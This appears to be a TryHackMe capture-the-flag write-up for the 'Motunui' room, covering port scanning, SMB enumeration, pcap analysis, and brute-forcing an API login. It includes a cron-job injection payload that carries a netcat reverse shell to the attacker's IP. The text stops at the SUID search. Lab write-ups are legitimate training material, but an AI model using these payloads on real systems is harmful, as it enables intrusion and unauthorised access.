<h1 align="center">Motunui</h1>
<p align="center">2025, October 8<br>Hey there, fellow lifelong learner! I´m <a href="https://www.linkedin.com/in/rosanafssantos/">Rosana</a>, and I’m excited to join you on this adventure, part of my <code>520</code>-day-streak in <a href="https://tryhackme.com">TryHackMe</a>.<br>
<em>Hack the island of Motunui</em>.<br>
<img width="80px" src="https://github.com/user-attachments/assets/e623fb7e-5ce9-4342-b578-d4f54167a477"><br>
Access it <a href="https://tryhackme.com/room/motunui">here</a>.<br>
<img width="1200px" src="https://github.com/user-attachments/assets/2b19678d-951c-4556-aa1d-6a4a65234c27"></p>


<h2>Task 1 . Motunui</h2>
<p>Deploy the machone and get root privileges.</p>

<p><em>Answer the questions below</em></p>


<br>
<h1 align="center">Summary</h1>
<p>

- [Port Scanning](#1)<br>  
- [Web Vulberability Scanning](#2)<br>
- [SMB Enumeration](#3)<br>
- [Static Host Mapping](#4)<br>
- [Web Interface Inspection](#5)<br>
- [Directory and File Enumeration](#6)<br>
- [Web Interface Inspection](#7)<br>
- [Static Host Mapping](#8)<br>
- [Weaponization, Delivery & Execution](#9)<br>
- [Initial Foothold](#10)<br>
- [Privilege Escalation & User Flag](#11)<br>
- [Privilege Escalation & Root Flag](#12)</p>

<br>
<br>
<br>
<br>
<br>
<br>
<br>
<h1 align="center">Port Scanning<a id='1'></a></h1>
<p align="center"><strong>6</strong> open ports</p>
<br>

<div align="center"><p>

| **Port**           | **Service**          | **Version**                     |
|-------------------:|:---------------------|:--------------------------------|
| `22`               |`SSH`                 |OpenSSH 7.6p1 Ubuntu 4ubuntu0.3  |
| `80`               |`HTTP`                |Apache httpd 2.4.29              |
| `139`              |`SMB`                 |Samba smbd 3.X - 4.X             |
| `445`              |`SMB`                 |Samba smbd 4.7.6-Ubuntu          |
| `3000`             |`SSL/HTTP`            |Apache httpd 2.4.29              |
| `5000`             |`SSL/HTTP`            |Node.js                          |

</p></div><br>


```bash
:~/Motunui# nmap -sT -p- 22,xx.xxx.xxx.x
...
PORT     STATE SERVICE
22/tcp   open  ssh
80/tcp   open  http
139/tcp  open  netbios-ssn
445/tcp  open  microsoft-ds
3000/tcp open  ppp
5000/tcp open  upnp
```

```bash
:~/Motunui# nmap -sC -sV -Pn -p22,80,138,445,3000,5000 -T4 xx.xxx.xxx.x
...
PORT     STATE SERVICE     VERSION
22/tcp   open  ssh         OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
...
80/tcp   open  http        Apache httpd 2.4.29 ((Ubuntu))
|_http-server-header: Apache/2.4.29 (Ubuntu)
|_http-title: Apache2 Ubuntu Default Page: It works
139/tcp  open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
445/tcp  open  netbios-ssn Samba smbd 4.7.6-Ubuntu (workgroup: WORKGROUP)
3000/tcp open  ppp?
| fingerprint-strings: 
|   FourOhFourRequest: 
|     HTTP/1.1 404 Not Found
|     Content-Security-Policy: default-src 'none'
|     X-Content-Type-Options: nosniff
|     Content-Type: text/html; charset=utf-8
|     Content-Length: 174
|     Date: Wed, 08 Oct 2025 xx:xx:xx GMT
|     Connection: close
|     <!DOCTYPE html>
|     <html lang="en">
|     <head>
|     <meta charset="utf-8">
|     <title>Error</title>
|     </head>
|     <body>
|     <pre>Cannot GET /nice%20ports%2C/Tri%6Eity.txt%2ebak</pre>
|     </body>
|     </html>
|   GetRequest: 
|     HTTP/1.1 404 Not Found
|     Content-Security-Policy: default-src 'none'
|     X-Content-Type-Options: nosniff
|     Content-Type: text/html; charset=utf-8
|     Content-Length: 139
|     Date: Wed, 08 Oct 2025 xx:xx:xx GMT
|     Connection: close
|     <!DOCTYPE html>
|     <html lang="en">
|     <head>
|     <meta charset="utf-8">
|     <title>Error</title>
|     </head>
|     <body>
|     <pre>Cannot GET /</pre>
|     </body>
|     </html>
|   HTTPOptions: 
|     HTTP/1.1 404 Not Found
|     Content-Security-Policy: default-src 'none'
|     X-Content-Type-Options: nosniff
|     Content-Type: text/html; charset=utf-8
|     Content-Length: 143
|     Date: Wed, 08 Oct 2025 xx:xx:xx GMT
|     Connection: close
|     <!DOCTYPE html>
|     <html lang="en">
|     <head>
|     <meta charset="utf-8">
|     <title>Error</title>
|     </head>
|     <body>
|     <pre>Cannot OPTIONS /</pre>
|     </body>
|_    </html>
5000/tcp open  ssl/http    Node.js (Express middleware)
|_http-title: Site doesn't have a title (text/html; charset=utf-8).
| ssl-cert: Subject: organizationName=Motunui/stateOrProvinceName=Motunui/countryName=GB
| Not valid before: 2020-08-03Txx:xx:xx
|_Not valid after:  2021-08-03Txx:xx:xx
|_ssl-date: TLS randomness does not represent time
| tls-alpn: 
|_  http/1.1
| tls-nextprotoneg: 
|   http/1.1
|_  http/1.0
...
Host script results:
|_nbstat: NetBIOS name: MOTUNUI, NetBIOS user: <unknown>, NetBIOS MAC: <unknown> (unknown)
| smb-os-discovery: 
|   OS: Windows 6.1 (Samba 4.7.6-Ubuntu)
|   Computer name: motunui
|   NetBIOS computer name: MOTUNUI\x00
|   Domain name: \x00
|   FQDN: motunui
|_  System time: 2025-10-08Txx:xx:xx6+00:00
| smb-security-mode: 
|   account_used: guest
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: disabled (dangerous, but default)
| smb2-security-mode: 
|   2.02: 
|_    Message signing enabled but not required
| smb2-time: 
|   date: 2025-10-08Txx:xx:xx
|_  start_date: N/A
```

<br>
<h1 align="center">Web Vulberability Scanning<a id='2'></a></h1>

```bash
:~/Motunui# nikto -h xx.xxx.xxx.x
- Nikto v2.1.5
---------------------------------------------------------------------------
+ Target IP:          xx.xxx.xxx.x
+ Target Hostname:    xx.xxx.xxx.x
+ Target Port:        80
+ Start Time:         2025-10-08 xx:xx:xx (GMT1)
---------------------------------------------------------------------------
+ Server: Apache/2.4.29 (Ubuntu)
+ Server leaks inodes via ETags, header found with file /, fields: 0x2aa6 0x5a9dc742b86d1 
+ The anti-clickjacking X-Frame-Options header is not present.
+ No CGI Directories found (use '-C all' to force check all possible dirs)
+ Allowed HTTP Methods: OPTIONS, HEAD, GET, POST 
+ OSVDB-3233: /icons/README: Apache default file found.
+ 6544 items checked: 0 error(s) and 4 item(s) reported on remote host
+ End Time:           2025-10-08 xx:xx:xx (GMT1) (13 seconds)
---------------------------------------------------------------------------
+ 1 host(s) tested
```

```bash
:~/Motunui# nikto -h xx.xxx.xxx.x:3000
- Nikto v2.1.5
---------------------------------------------------------------------------
+ Target IP:          xx.xxx.xxx.x
+ Target Hostname:    xx.xxx.xxx.x
+ Target Port:        3000
+ Start Time:         2025-10-08 xx:xx:xx (GMT1)
---------------------------------------------------------------------------
+ Server: No banner retrieved
+ The anti-clickjacking X-Frame-Options header is not present.
+ Uncommon header 'content-security-policy' found, with contents: default-src 'none'
+ Uncommon header 'x-content-type-options' found, with contents: nosniff
+ No CGI Directories found (use '-C all' to force check all possible dirs)
+ 6544 items checked: 24 error(s) and 3 item(s) reported on remote host
+ End Time:           2025-10-08 xx:xx:xx (GMT1) (14 seconds)
---------------------------------------------------------------------------
+ 1 host(s) tested
```

```bash
:~/Motunui# nikto -h xx.xxx.xxx.x:5000
- Nikto v2.1.5
---------------------------------------------------------------------------
+ Target IP:          xx.xxx.xxx.x
+ Target Hostname:    xx.xxx.xxx.x
+ Target Port:        5000
---------------------------------------------------------------------------
+ SSL Info:        Subject: /C=GB/ST=Motunui/O=Motunui
                   Ciphers: ECDHE-RSA-AES128-GCM-SHA256
                   Issuer:  /C=GB/ST=Motunui/O=Motunui
+ Start Time:         2025-10-08 22:42:40 (GMT1)
---------------------------------------------------------------------------
+ Server: No banner retrieved
+ Retrieved x-powered-by header: Express
+ Server leaks inodes via ETags, header found with file /, fields: 0xW/7 0xwLE3/i15JFnyb/djzORFdKW1qwM 
+ The anti-clickjacking X-Frame-Options header is not present.
+ Uncommon header 'content-security-policy' found, with contents: default-src 'none'
+ Uncommon header 'x-content-type-options' found, with contents: nosniff
+ No CGI Directories found (use '-C all' to force check all possible dirs)
+ Allowed HTTP Methods: GET, HEAD
...
```

<br>
<h1 align="center">SMB Enumeration<a id='3'></a></h1>
<p align="center">enum4linux</p>

```bash
:~/Motunui# enum4linux xx.xxx.xxx.x
WARNING: polenum.py is not in your path.  Check that package is installed and your PATH is sane.
Starting enum4linux v0.8.9 ( http://labs.portcullis.co.uk/application/enum4linux/ ) on Wed Oct  8 xx:xx:xx 2025

 ========================== 
|    Target Information    |
 ========================== 
Target ........... xx.xxx.xxx.x
RID Range ........ 500-550,1000-1050
Username ......... ''
Password ......... ''
Known Usernames .. administrator, guest, krbtgt, domain admins, root, bin, none


 ==================================================== 
|    Enumerating Workgroup/Domain on xx.xxx.xxx.x    |
 ==================================================== 
[+] Got domain/workgroup name: WORKGROUP

 ============================================ 
|    Nbtstat Information for xx.xxx.xxx.x    |
 ============================================ 
Looking up status of xx.xxx.xxx.x
	MOTUNUI         <00> -         B <ACTIVE>  Workstation Service
	MOTUNUI         <03> -         B <ACTIVE>  Messenger Service
	MOTUNUI         <20> -         B <ACTIVE>  File Server Service
	..__MSBROWSE__. <01> - <GROUP> B <ACTIVE>  Master Browser
	WORKGROUP       <00> - <GROUP> B <ACTIVE>  Domain/Workgroup Name
	WORKGROUP       <1d> -         B <ACTIVE>  Master Browser
	WORKGROUP       <1e> - <GROUP> B <ACTIVE>  Browser Service Elections

	MAC Address = 00-00-00-00-00-00

 ===================================== 
|    Session Check on xx.xxx.xxx.x    |
 ===================================== 
[+] Server xx.xxx.xxx.x allows sessions using username '', password ''

 =========================================== 
|    Getting domain SID for xx.xxx.xxx.x    |
 =========================================== 
Domain Name: WORKGROUP
Domain Sid: (NULL SID)
[+] Can't determine if host is part of domain or part of a workgroup

 ====================================== 
|    OS information on xx.xxx.xxx.x    |
 ====================================== 
...
[+] Got OS info for xx.xxx.xxx.x from smbclient: 
[+] Got OS info for xx.xxx.xxx.x from srvinfo:
	MOTUNUI        Wk Sv PrQ Unx NT SNT motunui server (Samba, Ubuntu)
	platform_id     :	500
	os version      :	6.1
	server type     :	0x809a03

 ============================= 
|    Users on xx.xxx.xxx.x    |
 ============================= 
...

 ========================================= 
|    Share Enumeration on xx.xxx.xxx.x    |
 ========================================= 

	Sharename       Type      Comment
	---------       ----      -------
	print$          Disk      Printer Drivers
	traces          Disk      Network shared files
	IPC$            IPC       IPC Service (motunui server (Samba, Ubuntu))
SMB1 disabled -- no workgroup available

[+] Attempting to map shares on xx.xxx.xxx.x
//xx.xxx.xxx.x/print$	Mapping: DENIED, Listing: N/A
//xx.xxx.xxx.x/traces	Mapping: OK, Listing: OK
//xx.xxx.xxx.x/IPC$	[E] Can't understand response:
NT_STATUS_OBJECT_NAME_NOT_FOUND listing \*

 ==================================================== 
|    Password Policy Information for xx.xxx.xxx.x    |
 ==================================================== 
[E] Dependent program "polenum.py" not present.  Skipping this check.  Download polenum from http://labs.portcullis.co.uk/application/polenum/


 ============================== 
|    Groups on xx.xxx.xxx.x    |
 ============================== 

[+] Getting builtin groups:

[+] Getting builtin group memberships:

[+] Getting local groups:

[+] Getting local group memberships:

[+] Getting domain groups:

[+] Getting domain group memberships:

 ======================================================================= 
|    Users on xx.xxx.xxx.x via RID cycling (RIDS: 500-550,1000-1050)    |
 ======================================================================= 
...
[+] Enumerating users using SID S-1-5-21-2796028439-693928412-3159673858 and logon username '', password ''
...
S-1-5-21-2796028439-693928412-3159673858-501 MOTUNUI\nobody (Local User)
...
S-1-5-21-2796028439-693928412-3159673858-513 MOTUNUI\None (Domain Group)
...
[+] Enumerating users using SID S-1-22-1 and logon username '', password ''
S-1-22-1-1000 Unix User\moana (Local User)
S-1-22-1-1001 Unix User\network (Local User)
[+] Enumerating users using SID S-1-5-32 and logon username '', password ''
...
S-1-5-32-544 BUILTIN\Administrators (Local Group)
S-1-5-32-545 BUILTIN\Users (Local Group)
S-1-5-32-546 BUILTIN\Guests (Local Group)
S-1-5-32-547 BUILTIN\Power Users (Local Group)
S-1-5-32-548 BUILTIN\Account Operators (Local Group)
S-1-5-32-549 BUILTIN\Server Operators (Local Group)
S-1-5-32-550 BUILTIN\Print Operators (Local Group)
...
 ============================================= 
|    Getting printer info for xx.xxx.xxx.x    |
 ============================================= 
No printers returned.


enum4linux complete on Wed Oct  8 xx:xx:xx 2025
```

<br>
<p align="center">smbclient<br> Identified <ins>print$</ins>, <ins>traces</ins>, and <ins>IPC$</ins>.</p>

```bash
:~/Motunui# smbclient -L xx.xxx.xxx.x -N

	Sharename       Type      Comment
	---------       ----      -------
	print$          Disk      Printer Drivers
	traces          Disk      Network shared files
	IPC$            IPC       IPC Service (motunui server (Samba, Ubuntu))
SMB1 disabled -- no workgroup available
```

<br>
<p align="center">smbmap<br>Downloaded <ins>ticket_6746.pcapng</ins>.</p>

```bash
:~/Motunui# smbmap -H xx.xxx.xxx.x -u guest -p ' '
[+] Finding open SMB ports....
[+] Guest SMB session established on xx.xxx.xxx.x...
[+] IP: xx.xxx.xxx.x:445	Name: xx.xxx.xxx.x                                      
	Disk                                                  	Permissions	Comment
	----                                                  	-----------	-------
	print$                                            	NO ACCESS	Printer Drivers
	.                                                  
	dr--r--r--                0 Thu Jul  9 04:48:54 2020	.
	dr--r--r--                0 Thu Jul  9 04:48:27 2020	..
	dr--r--r--                0 Thu Jul  9 04:50:12 2020	moana
	dr--r--r--                0 Mon Aug  3 17:22:03 2020	maui
	dr--r--r--                0 Thu Jul  9 04:50:40 2020	tui
	traces                                            	READ ONLY	Network shared files
	IPC$                                              	NO ACCESS	IPC Service (motunui server (Samba, Ubuntu))
```

```bash
:~/Motunui# smbclient //xx.xxx.xxx.x/traces -N
Try "help" to get a list of possible commands.
smb: \> ls
  .                                   D        0  Thu Jul  9 04:48:54 2020
  ..                                  D        0  Thu Jul  9 04:48:27 2020
  moana                               D        0  Thu Jul  9 04:50:12 2020
  maui                                D        0  Mon Aug  3 17:22:03 2020
  tui                                 D        0  Thu Jul  9 04:50:40 2020

		19475088 blocks of size 1024. 11271588 blocks available
smb: \> cd moana
smb: \moana\> ls
  .                                   D        0  Thu Jul  9 04:50:12 2020
  ..                                  D        0  Thu Jul  9 04:48:54 2020
  ticket_64947.pcapng                 N        0  Tue Jul  7 17:51:43 2020
  ticket_31762.pcapng                 N        0  Tue Jul  7 17:51:28 2020

		19475088 blocks of size 1024. 11271588 blocks available
...
smb: \> cd maui
smb: \maui\> ls 
  .                                   D        0  Mon Aug  3 17:22:03 2020
  ..                                  D        0  Thu Jul  9 04:48:54 2020
  ticket_6746.pcapng                  N    79296  Mon Aug  3 17:21:16 2020

		19475088 blocks of size 1024. 11271588 blocks available
smb: \maui\> get ticket_6746.pcapng
getting file \maui\ticket_6746.pcapng of size 79296 as ticket_6746.pcapng (38716.9 KiloBytes/sec) (average 25812.5 KiloBytes/sec)
smb: \maui\> 
...
smb: \tui\> ls
  .                                   D        0  Thu Jul  9 04:50:40 2020
  ..                                  D        0  Thu Jul  9 04:48:54 2020
  ticket_7876.pcapng                  N        0  Tue Jul  7 17:52:24 2020
  ticket_1325.pcapng                  N        0  Tue Jul  7 17:52:30 2020

		19475088 blocks of size 1024. 11271588 blocks available
```

<br>
<p align="center">wireshark<br>Analyzed <ins>ticket_6746.pcapng</ins>.<br>Identified: <ins>dashboard.png</ins>, <br>Client Hello www.jake-ruston.com, Server Hello, Change Cipher, A    0x4f1e 0x079d 0x0a06 0x8653, AAAA 0x6d1c 0xe69f 0x9e04 0x8d51</p>

<img width="1164" height="198" alt="image" src="https://github.com/user-attachments/assets/5c1b3184-c41a-429d-82d7-ff2ecd9bdc71" />

<br>
<br>
<br>

<img width="1210" height="393" alt="image" src="https://github.com/user-attachments/assets/d55f7cb5-e1a8-4e44-ab75-f53888fd39e0" />

<br>
<br>
<br>

<p align="center">Opened <ins>dashborad.png</ins> which contains:<br><code>d3v3lopm3nt.motonui.thm</code><br> and <em></em>The pages included on this virtual host are solely for developers of Motunui. Please ensure you have authorisation  to ve viewing this</em>.</p>

<img width="1223" height="196" alt="image" src="https://github.com/user-attachments/assets/02dffd6c-d835-4591-a7d5-c0b5aac02cc8" />

<br>
<br>
<br>
<h1 align="center">Static Host Mapping<a id='4'></a></h1>

```bash
xx.xxx.xxx.x d3v3lopm3nt.motunui.thm motonui.thm
```

<br>
<h1 align="center">Web Interface Inspection<a id='5'></a></h1>
<br>
<p align="center">80</p>

<img width="1041" height="194" alt="image" src="https://github.com/user-attachments/assets/9bc8a1ba-71ad-493c-9d31-3b5a8ded00da" />

<br>
<br>
<br>
<h1 align="center">Directory and File Enumeration<a id='6'></a></h1>
<p align="center">d3v3lopm3nt.motunui.thm<br>/index.php  .  /docs</p>
  
```bash
:~/Motunui# gobuster dir -u http://d3v3lopm3nt.motunui.thm/ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x html,php
...
/index.php            (Status: 200) [Size: 248]
/docs                 (Status: 301) [Size: 333] [--> http://d3v3lopm3nt.motunui.thm/docs/]
...
Progress: 654825 / 654828 (100.00%)
```

<br>
<p align="center">d3v3lopm3nt.motunui.thm/docs/<br>/README.md</p>

```bash
:~/Motunui# gobuster dir -u http://d3v3lopm3nt.motunui.thm/docs/ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x md,bak,php
...
/index.php            (Status: 302) [Size: 0] [--> README.md]
/README.md            (Status: 200) [Size: 230]
/CHANGELOG.md         (Status: 200) [Size: 0]
```

<br>
<h1 align="center">Web Interface Inspection<a id='7'></a></h1>
<br>
<p align="center">d3v3lopm3nt.motunui.thm/docs/README.md</p>

<img width="1270" height="267" alt="image" src="https://github.com/user-attachments/assets/681e88bc-23d8-4b39-85ea-fdd5fdd594be" />

```bash
# Documentation for the in-development API

##### [Changelog](CHANGELOG.md) | [Issues](ISSUES.md)

Please do not distribute this documentation outside of the development team.

## Routes
Find all of the routes [here](ROUTES.md).
```

<br>
<p align="center">d3v3lopm3nt.motunui.thm/docs/ROUTES.md<br>api.motonui.thm:3000/v2/<br>POST /login  username  password  hash<br>POST /jobs hash</p>

```bash
# Routes

The base URL for the api is `api.motunui.thm:3000/v2/`.

### `POST /login`
Returns the hash for the specified user to be used for authorisation.
#### Parameters
- `username`
- `password`
#### Response (200)
```js
{
	"hash": String()
}

#### Response (401)
```js
{
	"error": "invalid credentials"
}


### ð\u0178\u201d `GET /jobs`
Returns all the cron jobs running as the current user.
#### Parameters
- `hash`
#### Response (200)
```js
{
	"jobs": Array()
}

#### Response (403)
```js
{
	"error": "you are unauthorised to view this resource"
}


### ð\u0178\u201d `POST /jobs`
Creates a new cron job running as the current user.
#### Parameters
- `hash`
#### Response (201)
```js
{
	"job": String()
}

#### Response (401)
```js
{
	"error": "you are unauthorised to view this resource"
}
```


<img width="1275" height="765" alt="image" src="https://github.com/user-attachments/assets/f428e4b5-db6e-44ac-bfa4-926ce29f2e34" />

<br>
<br>
<br>
<h1 align="center">Static Host Mapping<a id='8'></a></h1>

```bash
xx.xxx.xxx.x d3v3lopm3nt.motunui.thm motonui.thm api.motonui.thm
```

<br>
<h1 align="center">Weaponization, Delivery & Execution<a id='9'></a></h1>
<p align="center">api.motonui.thm:3000/v2/login</p>

```bash
:~/Motunui# curl http://api.motunui.thm:3000/v2/login
{"error":"method not allowed"}
```

```bash
:~/Motunui# curl http://api.motunui.thm:3000/v1/login
{"message":"please get maui to update these routes"}
```

```bash
:~/Motunui# curl -X POST http://api.motunui.thm:3000/v2/login -d '{"username":"maui","password":"password"}'
{"error":"invalid credentials"}
```

<p align="center">maui:island</p>

```bash
:~/Motunui# ffuf -u http://api.motunui.thm:3000/v2/login -w /usr/share/wordlists/rockyou.txt -X POST -H 'Content-Type: application/json' -d '{"username":"maui","password":"FUZZ"}' -fs 31
...
island                  [Status: 200, Size: 19, Words: 1, Lines: 1]
```

<img width="1242" height="502" alt="image" src="https://github.com/user-attachments/assets/f13ac44f-bede-4943-a48d-aee5c7a0a2b3" />

<br>
<br>
<br>

```bash
:~/Motunui# curl http://api.motunui.thm:3000/v2/login -X POST -H 'Content-Type: application/json' -d '{"username":"maui","password":"island"}'
```

<p align="center">{"hash":"--------"}</p>

<img width="1351" height="120" alt="image" src="https://github.com/user-attachments/assets/0ee70357-156c-4cd0-b84f-72d2c0c6290c" />

<br>
<br>
<br>

```bash
:~/Motunui# curl -v http://api.motunui.thm:3000/v2/jobs -X GET -H 'Content-Type: application/json' -d '{"hash":"--------"}'
```

<img width="1325" height="106" alt="image" src="https://github.com/user-attachments/assets/ebd0cee6-4de0-4cff-9ab9-3c429837c6d7" />

<br>
<br>
<br>

<img width="836" height="262" alt="image" src="https://github.com/user-attachments/assets/e6500bda-600b-4ae6-b479-b9cfd8edc153" />

<br>
<br>
<br>

```bash
POST /v2/jobs HTTP/1.1
Host: api.motunui.thm:3000
User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:131.0) Gecko/20100101 Firefox/131.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/png,image/svg+xml,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate, br
Connection: close
Upgrade-Insecure-Requests: 1
Priority: u=0, i
Content-Type: application/x-www-form-urlencoded

{
  "hash": "--------",
	"job": "* * * * * rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc xx.xxx.xx.xxx 9001 >/tmp/f"
}
```

<img width="1142" height="423" alt="image" src="https://github.com/user-attachments/assets/9b03b563-5b31-4ce7-9d54-f22496163651" />

<br>
<br>
<br>

<img width="843" height="291" alt="image" src="https://github.com/user-attachments/assets/83e5ed0a-c842-442a-9674-8495dc3eceed" />

<br>
<br>
<br>

<img width="1330" height="400" alt="image" src="https://github.com/user-attachments/assets/9e04fc28-50fe-4205-902e-82923558439b" />

<br>
<br>
<br>

<br>
<h1 align="center">Initial Foothold<a id='10'></a></h1>

```bash
www-data@motunui:/home$ ls
moana  network
```

```bash
www-data@motunui:/home/moana$ cat read_me
I know you've been on vacation and the last thing you want is me nagging you.

But will you please consider not using the same password for all services? It puts us all at risk.

I have started planning the new network design in packet tracer, and since you're 'the best engineer this island has seen', go find it and finish it.
```

```bash
www-data@motunui:/home/moana$ cat user.txt
cat: user.txt: Permission denied
```

```bash
www-data@motunui:/home/network/traces$ ls -lah
total 20K
drwxrwxr-x 5 network network 4.0K Jul  9  2020 .
drwxr-xr-x 3 network network 4.0K Jul  9  2020 ..
drwxrwxr-x 2 network network 4.0K Aug  3  2020 maui
drwxrwxr-x 2 network network 4.0K Jul  9  2020 moana
drwxrwxr-x 2 network network 4.0K Jul  9  2020 tui
```

<br>
<p align="center">network.pkt<br><code>PKT</code> files are network simulation files created with Cisco Packet Tracer software,<br>containing a saved network topology, device configurations, and embedded elements for interactive<br> practice and learning of networking concepts.</p>

```bash
www-data@motunui:/home$ find / -type f -name '*.pkt' -ls 2>/dev/null
   926350     76 -rwxrwxrwx   1 moana    moana       75918 Jul  9  2020 /etc/network.pkt
```

```bash
www-data@motunui:~$ getent hosts
127.0.0.1       localhost
127.0.1.1       motunui dev.motunui.thm api.motunui.thm
127.0.0.1       ip6-localhost ip6-loopback
```

```bash
www-data@motunui:/etc$ python3 -m http.server
```

```bash
:~/Motunui# curl "https://github.com/diego-treitos/linux-smart-enumeration/raw/master/lse.sh" -Lo lse.sh;chmod 700 lse.sh
  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current
                                 Dload  Upload   Total   Spent    Left  Speed
  0     0    0     0    0     0      0      0 --:--:-- --:--:-- --:--:--     0
100 48875  100 48875    0     0   215k      0 --:--:-- --:--:-- --:--:--  215k
```

```bash
www-data@motunui:~$ wget http://10.8.106.222/lse.sh && chmod +x lse.sh && ./lse.sh -i -l 1
```

<br>
<br>

<img width="1150" height="455" alt="image" src="https://github.com/user-attachments/assets/de88c9d6-b8ab-4f93-8e62-e7cde4136b49" />

```bash
[!] ret010 Cron tasks writable by user..................................... yes!
---
/var/spool/cron/crontabs
---
[*] ret020 Cron jobs....................................................... yes!
---
/etc/crontab:SHELL=/bin/sh
/etc/crontab:PATH=/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin
/etc/crontab:17 *	* * *	root    cd / && run-parts --report /etc/cron.hourly
/etc/crontab:25 6	* * *	root	test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.daily )
/etc/crontab:47 6	* * 7	root	test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.weekly )
/etc/crontab:52 6	1 * *	root	test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.monthly )
/etc/crontab:*  *    * * *   www-data	/usr/bin/crontab /var/spool/cron/crontabs/www-data
/etc/cron.d/popularity-contest:SHELL=/bin/sh
/etc/cron.d/popularity-contest:PATH=/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin
/etc/cron.d/popularity-contest:23 10 * * *   root    test -x /etc/cron.daily/popularity-contest && /etc/cron.daily/popularity-contest --crond
/etc/cron.d/certbot:SHELL=/bin/sh
/etc/cron.d/certbot:PATH=/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin
/etc/cron.d/certbot:0 */12 * * * root test -x /usr/bin/certbot -a \! -d /run/systemd/system && perl -e 'sleep int(rand(43200))' && certbot -q renew
/etc/cron.d/php:09,39 *     * * *     root   [ -x /usr/lib/php/sessionclean ] && if [ ! -d /run/systemd/system ]; then /usr/lib/php/sessionclean; fi
/etc/cron.d/mdadm:57 0 * * 0 root if [ -x /usr/share/mdadm/checkarray ] && [ $(date +\%d) -le 7 ]; then /usr/share/mdadm/checkarray --cron --all --idle --quiet; fi
---
[*] ret030 Can we read user crontabs....................................... nope
[*] ret040 Can we list other user cron tasks?.............................. nope
[*] ret050 Can we write to any paths present in cron jobs.................. yes!
---
/var/cache/apache2/mod_cache_disk
/var/crash
/var/crash/.
/var/spool/cron/crontabs/www-data
```

```bash
www-data@motunui:/etc$ file network.pkt
network.pkt: data
```

```bash
www-data@motunui:/$ cat /etc/network.pkt | base64 -w0
echo 'KZmbEVo1fGVJYkpMfrksjpipEacTcu1HwSeJJVV+M1aI0edduX21Y1XDrxmiDoCr8aiDsrUNAyX9EWWhZweq9/ewakdZdNq6aujdseMeK1TodMr2UMX...' > file
```

```bash
:~/Motunui# file file
file: ASCII text, with very long lines
```

```bash
:~/Motunui# base64 --decode file > t.pkt
```

```bash
:~/Motunui# file t.pkt
t.pkt: data
```

<br>

<p align="center">Packet Tracer Installation</p>
<p>
	
- google <code>Resource Hub - Cisco Networking Academy</code><br>
- click<br>
- log in<br>
- click download Packet Tracer<br>
- continue following the instructions on Cisco Resource Hub page</p>


<p align="center">Using Packet Tracer</p>
<p>
	
- Launch <code>Packet Tracer</code>. Click <code>File</code> > <code>Open</code>. Choose <ins>t.pkt</ins>. Click <code>Open</code><br>
- 1 . Double-click the switch<br>
- 2 . navigate to the <code>CLI</code>.<br>
- 3 . [ENTER] and a <code>Switch></code> will show up. Type <code>enable<code>. [ENTER] and a <code>Switch#</code> prompt will show up.<br>
- 4 . type <code>show running-config</code>. [ENTER].</p>

<img width="1623" height="858" alt="image" src="https://github.com/user-attachments/assets/5ddec520-26cd-436f-a803-cd28c1009e04" />

<br>
<br>
<br>
<h1 align="center">Privilege Escalation & User Flag<a id='11'></a></h1>
<p align="center">SSH with the credentials just discovered.<br>'moana':'············'</p>

```bash
moana@motunui:~$ cat user.txt
THM{*****_**_*******}
```

<br>
<p>1.1. What is the user flag?<br>
<code>THM{*****_**_*******}</code></p>
<br>
<br>

```bash
moana@motunui:~$ getent hosts
127.0.0.1       localhost
127.0.1.1       motunui dev.motunui.thm api.motunui.thm
127.0.0.1       ip6-localhost ip6-loopback
```

```bash
moana@motunui:~$ netstat -tunlp
(Not all processes could be identified, non-owned process info
 will not be shown, you would have to be root to see it all.)
Active Internet connections (only servers)
Proto Recv-Q Send-Q Local Address           Foreign Address         State       PID/Program name    
tcp        0      0 0.0.0.0:139             0.0.0.0:*               LISTEN      -                   
tcp        0      0 127.0.0.53:53           0.0.0.0:*               LISTEN      -                   
tcp        0      0 0.0.0.0:22              0.0.0.0:*               LISTEN      -                   
tcp        0      0 0.0.0.0:445             0.0.0.0:*               LISTEN      -                   
tcp        0      0 0.0.0.0:8000            0.0.0.0:*               LISTEN      -                   
tcp6       0      0 :::5000                 :::*                    LISTEN      -                   
tcp6       0      0 :::139                  :::*                    LISTEN      -                   
tcp6       0      0 :::80                   :::*                    LISTEN      -                   
tcp6       0      0 :::22                   :::*                    LISTEN      -                   
tcp6       0      0 :::3000                 :::*                    LISTEN      -                   
tcp6       0      0 :::445                  :::*                    LISTEN      -                   
udp        0      0 127.0.0.53:53           0.0.0.0:*                           -                   
udp        0      0 xx.xxx.xxx.x:68         0.0.0.0:*                           -                   
udp        0      0 10.201.127.255:137      0.0.0.0:*                           -                   
udp        0      0 xx.xxx.xxx.x:137        0.0.0.0:*                           -                   
udp        0      0 0.0.0.0:137             0.0.0.0:*                           -                   
udp        0      0 10.201.127.255:138      0.0.0.0:*                           -                   
udp        0      0 xx.xxx.xxx.x:138        0.0.0.0:*                           -                   
udp        0      0 0.0.0.0:138             0.0.0.0:*                           -    
```

```bash
moana@motunui:~$ find / -perm -4000 -type f -ls 2>/dev/null
   411110    112 -rwsr-xr-x   1 root     root       113528 Jul 10  2020 /usr/lib/snapd/snap-confine
   394289     12 -rwsr-xr-x   1 root     root        10232 Mar 28  2017 /usr/lib/eject/dmcrypt-get-device
